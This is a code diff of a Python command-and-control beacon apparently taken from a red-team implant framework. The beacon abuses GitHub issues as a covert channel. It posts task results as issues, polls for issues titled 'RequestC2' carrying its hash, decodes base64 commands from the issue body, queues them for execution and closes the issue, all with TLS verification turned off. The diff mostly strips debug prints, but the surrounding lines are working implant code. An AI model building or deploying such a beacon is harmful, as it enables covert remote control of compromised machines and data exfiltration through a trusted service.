@@ -21,7 +21,6 @@ class BeaconGithub(Beacon):
 
 
     def checkIn(self):
-        # try:
         sessions = []
         for it in self.taskResults:
             sessions.append(it)
@@ -56,27 +55,16 @@ class BeaconGithub(Beacon):
         url = "https://api.github.com/repos/" + self.project + "/issues"
         response = requests.post(url, data=postDataJson, headers=headers, verify=False)
 
-        # print( "status " , response.status_code )
-        # print( "content " , response.content )
-
         # Receive cmd
         headers = { "Authorization": self.token, "Accept": "application/vnd.github+json", "Cookie": "logged_in=no" }
         url = "https://api.github.com/repos/" + self.project + "/issues"
         response = requests.get(url, headers=headers, verify=False)
 
-        # print( "status " , response.status_code )
-        # print( "content " , response.content )
-
         jsonNode = json.loads(response.content.decode('utf-8'))
         for it in jsonNode:
-            # print(it)
             title = it["title"]
             body = it["body"]
             number = it["number"]
-
-            # print( "title " , title )
-            # print( "body " , body )
-            # print( "number " , number )
 
             if "RequestC2: " in title and self.beaconHash in title:
         
@@ -88,22 +76,17 @@ class BeaconGithub(Beacon):
                 self.cmdToTasks(bodyb64dd)
 
                 postClose = {"state": "closed"}
-                postDataJson = json.dumps(postClose, separators=(',', ':'))
+                postDataJson = ""
+                try:
+                    postDataJson = json.dumps(postClose, separators=(',', ':'))
+                except:
+                    pass
                 headers = { "Authorization": self.token, "Content-Type": "application/json", "Cookie": "logged_in=no" }
                 url = "https://api.github.com/repos/" + self.project + "/issues/" + str(number)
                 response = requests.post(url, data=postDataJson, headers=headers, verify=False)
 
-                # print( "status " , response.status_code )
-                # print( "content " , response.content )
-
-        # except:
-        #   print("An exception occurred") 
-
-
-
     def runTasks(self):
         self.execInstruction()
-
 
 
 def main() -> int:
@@ -118,13 +101,9 @@ def main() -> int:
     beaconGithub = BeaconGithub(project, token)
     
     while 1:
-        # try:
         beaconGithub.checkIn()
 
         beaconGithub.runTasks()
-
-        # except:
-        #   print("An exception occurred") 
 
         time.sleep(beaconGithub.sleepTimeMs/1000)
 
